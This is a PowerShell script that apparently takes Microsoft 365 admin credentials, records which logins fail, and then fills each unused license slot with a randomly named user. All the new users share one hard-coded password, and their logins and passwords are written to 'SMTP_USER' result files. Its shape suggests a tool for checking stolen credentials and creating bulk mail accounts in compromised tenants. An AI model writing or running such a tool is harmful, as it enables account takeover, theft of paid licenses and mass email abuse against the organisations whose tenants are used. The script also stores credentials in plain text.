param ($UserName, $Password)
		
	$User = $UserName
   $password =  ConvertTo-SecureString -String $Password
    $UserCredential = New-Object System.Management.Automation.PSCredential ($User, $password)

function getRandomString($lenght) {
	return -join ((65..90) + (97..122) | Get-Random -Count $lenght | % {[char]$_})
}

		Try	
            {
				Write-Host "Checking $User"  -ForegroundColor Yellow
				Connect-MsolService -Credential $UserCredential -ErrorAction stop
			 
            }
            Catch
            {
                Write-Host "Login Failed $User" -ForegroundColor Red
                
                Add-Content ./Results/Login_Failed.txt "$User"
            }
 

$Alias=$User.Split("@")
$domain_accout=$Alias[1]
$AccountSkuIds=Get-MsolAccountSku
$time=0;
$timelong=0;
    Try
    {
        Write-host "Creating All User SMTP for $User :" -ForegroundColor Yellow 
	foreach ($sup in $AccountSkuIds) { 


for($x=$sup.ConsumedUnits; $x -lt $sup.ActiveUnits; $x=$x+1){ 

		 Try	
            {
				
			$Aliasname=getRandomString 10
			$Aliasname=$Aliasname.ToLower() 
		 
		$currentMessages =  New-MsolUser -UserPrincipalName "$($Aliasname)@$($domain_accout)" -DisplayName "$($Aliasname)" -FirstName "$($Aliasname)" -LastName "$($Aliasname)" -UsageLocation "US" -LicenseAssignment $sup.AccountSkuId  -Password "pa687AZ@" -ForceChangePassword:$false -ErrorAction stop | Select UserPrincipalName,Password
 
		$result=$currentMessages.UserPrincipalName+";"+$currentMessages.Password	
		Add-Content ./Results/ACOUNT_SMTP_USER/$domain_accout.txt $result
		 
		 }
            Catch
            {
             Write-host "Sleep 60" -ForegroundColor Green			
			Start-Sleep -s 80
           $x=$x-1
		   }


	
		
		}
		
	}
		Write-host "Success" -ForegroundColor Green			
        Start-Sleep -s 5
       
		 
    }catch
    {
        Write-Host "Failed" -ForegroundColor Red
	  Start-Sleep -s 5
    }

Disconnect-ExchangeOnline -Confirm:$false


